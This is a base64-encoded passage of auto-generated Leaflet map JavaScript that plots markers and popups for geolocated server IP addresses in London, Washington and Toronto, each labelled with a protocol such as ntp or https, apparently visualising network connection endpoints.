ICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9kMjllNWIzZTNlNTU0NGVmYmJmMTNkZWI4N2QzODEzNiA9IEwubWFya2VyKAogICAgICAgICAgICBbNTEuNTE0MiwgLTAuMDkzMV0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzE2NjkzYjE1MjQ4NDQ0Zjg5NWM4ZDc1NWFhM2Q4YWI2ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2QyOWU1YjNlM2U1NTQ0ZWZiYmYxM2RlYjg3ZDM4MTM2LnNldEljb24oaWNvbl8xNjY5M2IxNTI0ODQ0NGY4OTVjOGQ3NTVhYTNkOGFiNik7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF9mYjVkYjQ2ZTg4ZTg0ZjQzOTRlOTdkNWUwMTdmODkzOCA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzVlMDgzMDZlZmYyODQxYTdiNzFhOWJjMDk4MGQ4ODc0ID0gJChgPGRpdiBpZD0iaHRtbF81ZTA4MzA2ZWZmMjg0MWE3YjcxYTliYzA5ODBkODg3NCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9R0IsIENvdW50cnlOYW1lPVVuaXRlZCBLaW5nZG9tLCBTdGF0ZT1FbmdsYW5kLCBDaXR5PUxvbmRvbiwgTG9uZ2l0dWRlPS0wLjA5MzEsIExhdGl0dWRlPTUxLjUxNDI8YnI+OTEuMTg5Ljk0LjQ8YnI+cHJvdG9jb2w9bnRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF9mYjVkYjQ2ZTg4ZTg0ZjQzOTRlOTdkNWUwMTdmODkzOC5zZXRDb250ZW50KGh0bWxfNWUwODMwNmVmZjI4NDFhN2I3MWE5YmMwOTgwZDg4NzQpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9kMjllNWIzZTNlNTU0NGVmYmJmMTNkZWI4N2QzODEzNi5iaW5kUG9wdXAocG9wdXBfZmI1ZGI0NmU4OGU4NGY0Mzk0ZTk3ZDVlMDE3Zjg5MzgpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2QyOWU1YjNlM2U1NTQ0ZWZiYmYxM2RlYjg3ZDM4MTM2LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYExvbmRvbiwgVW5pdGVkIEtpbmdkb20sIHByb3RvY29sPW50cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzc2YmE1NWY4MjgyODQ1Y2ZiMTFhNTZiNDU5MTNkYjdlID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzc0ZDkzMTQ4NDY4NzRmYzRiOTY5NTIzNGJhZmY4MGEzID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzc2YmE1NWY4MjgyODQ1Y2ZiMTFhNTZiNDU5MTNkYjdlLnNldEljb24oaWNvbl83NGQ5MzE0ODQ2ODc0ZmM0Yjk2OTUyMzRiYWZmODBhMyk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF81ZTBhZTQzOWQ2YzQ0ZDBlOGRhMDlhYjRjYjdlYmFiOSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzczODM0YTUxZDhjMjRhZWY4OTNhZDU0MGNhYTRiYjdlID0gJChgPGRpdiBpZD0iaHRtbF83MzgzNGE1MWQ4YzI0YWVmODkzYWQ1NDBjYWE0YmI3ZSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj41Mi4yMzkuMjIwLjY0PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF81ZTBhZTQzOWQ2YzQ0ZDBlOGRhMDlhYjRjYjdlYmFiOS5zZXRDb250ZW50KGh0bWxfNzM4MzRhNTFkOGMyNGFlZjg5M2FkNTQwY2FhNGJiN2UpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl83NmJhNTVmODI4Mjg0NWNmYjExYTU2YjQ1OTEzZGI3ZS5iaW5kUG9wdXAocG9wdXBfNWUwYWU0MzlkNmM0NGQwZThkYTA5YWI0Y2I3ZWJhYjkpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzc2YmE1NWY4MjgyODQ1Y2ZiMTFhNTZiNDU5MTNkYjdlLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFdhc2hpbmd0b24sIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfMWMwNTExN2MxNThiNDFmZWE4OTZlZjkwMjVjMzg2NzcgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fODkwNjk4ZjJmMmFiNGQyMmI5ZjM3OGQ0M2Q1N2NkZjggPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfMWMwNTExN2MxNThiNDFmZWE4OTZlZjkwMjVjMzg2Nzcuc2V0SWNvbihpY29uXzg5MDY5OGYyZjJhYjRkMjJiOWYzNzhkNDNkNTdjZGY4KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzk2OTczMmMyMjliMjQ0ZWZhYjk0YmNlMDcyNzhmNjkzID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfMmUwMmE2OGIyNjVhNGE0Y2E5YzEyOTEwMWJhYTg3ZjIgPSAkKGA8ZGl2IGlkPSJodG1sXzJlMDJhNjhiMjY1YTRhNGNhOWMxMjkxMDFiYWE4N2YyIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1DQSwgQ291bnRyeU5hbWU9Q2FuYWRhLCBTdGF0ZT1PbnRhcmlvLCBDaXR5PVRvcm9udG8sIExvbmdpdHVkZT0tNzkuNDIwNCwgTGF0aXR1ZGU9NDMuNjY1NTxicj40MC44NS4yMzIuNjQ8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzk2OTczMmMyMjliMjQ0ZWZhYjk0YmNlMDcyNzhmNjkzLnNldENvbnRlbnQoaHRtbF8yZTAyYTY4YjI2NWE0YTRjYTljMTI5MTAxYmFhODdmMik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzFjMDUxMTdjMTU4YjQxZmVhODk2ZWY5MDI1YzM4Njc3LmJpbmRQb3B1cChwb3B1cF85Njk3MzJjMjI5YjI0NGVmYWI5NGJjZTA3Mjc4ZjY5MykKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfMWMwNTExN2MxNThiNDFmZWE4OTZlZjkwMjVjMzg2NzcuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgVG9yb250bywgQ2FuYWRhLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzFmYmE3MWEzYjY1YjRiMjhiMDQ0NmVhZDEyNTlmZmMxID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzcyNTJlNWVjZjYyMDQ3ZmU5ZGYzNTdmMDk3ZmEyNDM4ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzFmYmE3MWEzYjY1YjRiMjhiMDQ0NmVhZDEyNTlmZmMxLnNldEljb24oaWNvbl83MjUyZTVlY2Y2MjA0N2ZlOWRmMzU3ZjA5N2ZhMjQzOCk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF8wM2QzMDZjOWZiZjY0ZjNiOTE2MjY0ODkwODI1ZWY1OCA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzRjOTZiMDk0YzllMzQ3ODU5Mzc5ZGU0YmJlZTU4NGUyID0gJChgPGRpdiBpZD0iaHRtbF80Yzk2YjA5NGM5ZTM0Nzg1OTM3OWRlNGJiZWU1ODRlMiIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+MTMuNzEuMTcyLjEyODxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfMDNkMzA2YzlmYmY2NGYzYjkxNjI2NDg5MDgyNWVmNTguc2V0Q29udGVudChodG1sXzRjOTZiMDk0YzllMzQ3ODU5Mzc5ZGU0YmJlZTU4NGUyKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfMWZiYTcxYTNiNjViNGIyOGIwNDQ2ZWFkMTI1OWZmYzEuYmluZFBvcHVwKHBvcHVwXzAzZDMwNmM5ZmJmNjRmM2I5MTYyNjQ4OTA4MjVlZjU4KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl8xZmJhNzFhM2I2NWI0YjI4YjA0NDZlYWQxMjU5ZmZjMS5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBUb3JvbnRvLCBDYW5hZGEsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfNjM1MGU3M2EzMDY3NGM3NDk2N2I0MDJmZjJmMWRkNDUgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fM2Q3ZWJlYjBlMjVhNGFjYTg5MmY5MThlZGVkYTdhYjcgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfNjM1MGU3M2EzMDY3NGM3NDk2N2I0MDJmZjJmMWRkNDUuc2V0SWNvbihpY29uXzNkN2ViZWIwZTI1YTRhY2E4OTJmOTE4ZWRlZGE3YWI3KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzgzZTgxYWNhNzczODRlMGM4ODk4YzIxOWMxMDhjNGExID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfMmEwYjRhYTMwNjkzNGMyOWJlMzVmMGFmNDZmMmU1MDMgPSAkKGA8ZGl2IGlkPSJodG1sXzJhMGI0YWEzMDY5MzRjMjliZTM1ZjBhZjQ2ZjJlNTAzIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1DQSwgQ291bnRyeU5hbWU9Q2FuYWRhLCBTdGF0ZT1PbnRhcmlvLCBDaXR5PVRvcm9udG8sIExvbmdpdHVkZT0tNzkuNDIwNCwgTGF0aXR1ZGU9NDMuNjY1NTxicj4xMy44OC4yNTUuMTE1PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF84M2U4MWFjYTc3Mzg0ZTBjODg5OGMyMTljMTA4YzRhMS5zZXRDb250ZW50KGh0bWxfMmEwYjRhYTMwNjkzNGMyOWJlMzVmMGFmNDZmMmU1MDMpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl82MzUwZTczYTMwNjc0Yzc0OTY3YjQwMmZmMmYxZGQ0NS5iaW5kUG9wdXAocG9wdXBfODNlODFhY2E3NzM4NGUwYzg4OThjMjE5YzEwOGM0YTEpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzYzNTBlNzNhMzA2NzRjNzQ5NjdiNDAyZmYyZjFkZDQ1LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9iZGI2NzY1YzA5NzA0MzI2YmNiNDE0NzdkY2Y1MTFkMyA9IEwubWFya2VyKAogICAgICAgICAgICBbNTEuNTE0MiwgLTAuMDkzMV0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzJmOGM0YjZmYmZkYzQ1MzQ4OTgxYjhhYTYyYmYwOWNmID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2JkYjY3NjVjMDk3MDQzMjZiY2I0MTQ3N2RjZjUxMWQzLnNldEljb24oaWNvbl8yZjhjNGI2ZmJmZGM0NTM0ODk4MWI4YWE2MmJmMDljZik7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF84YTJkMGIzYzEwMWI0ZjNhOWQxOGE2MWIzY2RlY2E5NCA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzg1MDg2ZGM2OTEyNzQ1ZWNiM2Q1NzFlZDgyNzVmMTIwID0gJChgPGRpdiBpZD0iaHRtbF84NTA4NmRjNjkxMjc0NWVjYjNkNTcxZWQ4Mjc1ZjEyMCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9R0IsIENvdW50cnlOYW1lPVVuaXRlZCBLaW5nZG9tLCBTdGF0ZT1FbmdsYW5kLCBDaXR5PUxvbmRvbiwgTG9uZ2l0dWRlPS0wLjA5MzEsIExhdGl0dWRlPTUxLjUxNDI8YnI+OTEuMTg5Ljk0LjQ8YnI+cHJvdG9jb2w9bnRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF84YTJkMGIzYzEwMWI0ZjNhOWQxOGE2MWIzY2RlY2E5NC5zZXRDb250ZW50KGh0bWxfODUwODZkYzY5MTI3NDVlY2IzZDU3MWVkODI3NWYxMjApOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9iZGI2NzY1YzA5NzA0MzI2YmNiNDE0NzdkY2Y1MTFkMy5iaW5kUG9wdXAocG9wdXBfOGEyZDBiM2MxMDFiNGYzYTlkMThhNjFiM2NkZWNhOTQpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2JkYjY3NjVjMDk3MDQzMjZiY2I0MTQ3N2RjZjUxMWQzLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYExvbmRvbiwgVW5pdGVkIEtpbmdkb20sIHByb3RvY29sPW50cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzZkYTJmNmE2NDliNDRmMDZiYjgzY2MzNzkxZTg4MGQxID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzFlNWZkYWRiMDU3NDQ3ZmFiZjA1MDAyMWFiYTYyODM5ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzZkYTJmNmE2NDliNDRmMDZiYjgzY2MzNzkxZTg4MGQxLnNldEljb24oaWNvbl8xZTVmZGFkYjA1NzQ0N2ZhYmYwNTAwMjFhYmE2MjgzOSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF84ZmRmOTlhMWNkMmM0ZjUxYThiN2NjY2U0YzIxZDZlYiA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sX2IxYTA3MTFkNTc2MDQ1Mjc4MzJhYzBkZDk1NGNjMDZkID0gJChgPGRpdiBpZD0iaHRtbF9iMWEwNzExZDU3NjA0NTI3ODMyYWMwZGQ5NTRjYzA2ZCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+MTMuNzEuMTcyLjEzMDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfOGZkZjk5YTFjZDJjNGY1MWE4YjdjY2NlNGMyMWQ2ZWIuc2V0Q29udGVudChodG1sX2IxYTA3MTFkNTc2MDQ1Mjc4MzJhYzBkZDk1NGNjMDZkKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfNmRhMmY2YTY0OWI0NGYwNmJiODNjYzM3OTFlODgwZDEuYmluZFBvcHVwKHBvcHVwXzhmZGY5OWExY2QyYzRmNTFhOGI3Y2NjZTRjMjFkNmViKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl82ZGEyZjZhNjQ5YjQ0ZjA2YmI4M2NjMzc5MWU4ODBkMS5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBUb3JvbnRvLCBDYW5hZGEsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfMzFhZjBlNDJlYTYzNDYxY2ExYTUzMGY2ZWU2ZDk2MDAgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fZGIzN2UyODQ5YjIwNGY1Yzg5MWVlNjQ5NzA0YTE1Y2MgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfMzFhZjBlNDJlYTYzNDYxY2ExYTUzMGY2ZWU2ZDk2MDAuc2V0SWNvbihpY29uX2RiMzdlMjg0OWIyMDRmNWM4OTFlZTY0OTcwNGExNWNjKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwX2EyYWJmNDM2YzYwYTRiMjNiNDA4ZGVlMDliMDlkMjhkID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfOWQwNTVmOTJlYTczNDgyNWFiMzlkMDM5YTQzMGUxMWIgPSAkKGA8ZGl2IGlkPSJodG1sXzlkMDU1ZjkyZWE3MzQ4MjVhYjM5ZDAzOWE0MzBlMTFiIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1DQSwgQ291bnRyeU5hbWU9Q2FuYWRhLCBTdGF0ZT1PbnRhcmlvLCBDaXR5PVRvcm9udG8sIExvbmdpdHVkZT0tNzkuNDIwNCwgTGF0aXR1ZGU9NDMuNjY1NTxicj4xMy43MS4xNzIuMTI4PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF9hMmFiZjQzNmM2MGE0YjIzYjQwOGRlZTA5YjA5ZDI4ZC5zZXRDb250ZW50KGh0bWxfOWQwNTVmOTJlYTczNDgyNWFiMzlkMDM5YTQzMGUxMWIpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl8zMWFmMGU0MmVhNjM0NjFjYTFhNTMwZjZlZTZkOTYwMC5iaW5kUG9wdXAocG9wdXBfYTJhYmY0